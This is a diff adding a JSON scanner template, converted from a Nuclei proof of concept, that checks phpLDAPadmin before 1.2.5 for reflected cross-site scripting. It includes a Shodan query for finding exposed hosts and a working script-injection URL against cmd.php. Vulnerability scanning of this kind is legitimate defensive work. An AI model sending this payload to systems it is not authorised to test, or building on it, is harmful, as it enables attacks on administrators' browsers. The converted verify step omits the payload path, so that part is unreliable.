@@ -1,0 +1,180 @@
+{
+  "id": "phpldapadmin-xss",
+  "name": "PHP LDAP Admin \u003c 1.2.5 - Cross-Site Scripting",
+  "author": "GodfatherOrwa,herry",
+  "severity": "MEDIUM",
+  "description": "PHP LDAP Admin is vulnerable to XSS.",
+  "references": [
+    "https://twitter.com/GodfatherOrwa/status/1701392754251563477"
+  ],
+  "tags": [
+    "php",
+    "phpldapadmin",
+    "xss"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "shodan": "html:\"phpLDAPadmin\""
+  },
+  "variables": {
+    "path": [
+      "/",
+      "/htdocs/index.php",
+      "/phpldapadmin"
+    ]
+  },
+  "variablesType": "pitchfork",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "\u003cscript\u003ealert(document.domain)\u003c/script\u003e",
+            "No such entry"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "WORD",
+          "part": "header",
+          "values": [
+            "text/html"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": true,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "phpldapadmin-xss",
+    "info": {
+      "name": "PHP LDAP Admin \u003c 1.2.5 - Cross-Site Scripting",
+      "author": "GodfatherOrwa,herry",
+      "severity": "medium",
+      "description": "PHP LDAP Admin is vulnerable to XSS.",
+      "reference": [
+        "https://twitter.com/GodfatherOrwa/status/1701392754251563477"
+      ],
+      "classification": {},
+      "metadata": {
+        "max_request": 9,
+        "shodan_query": "html:\"phpLDAPadmin\""
+      },
+      "tags": "php,phpldapadmin,xss"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "payloads": {
+          "path": [
+            "/",
+            "/htdocs/index.php",
+            "/phpldapadmin"
+          ]
+        },
+        "attack": "pitchfork",
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}",
+          "{{BaseURL}}{{path}}/cmd.php?cmd\u003dtemplate_engine\u0026dn\u003d%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E\u0026meth\u003dajax\u0026server_id\u003d1",
+          "{{BaseURL}}{{path}}/index.php?redirect\u003dtrue\u0026meth\u003dajax"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": true,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "\u003cscript\u003ealert(document.domain)\u003c/script\u003e",
+              "No such entry"
+            ],
+            "condition": "and",
+            "case_insensitive": false
+          },
+          {
+            "type": "word",
+            "negative": false,
+            "part": "header",
+            "words": [
+              "text/html"
+            ],
+            "case_insensitive": false
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
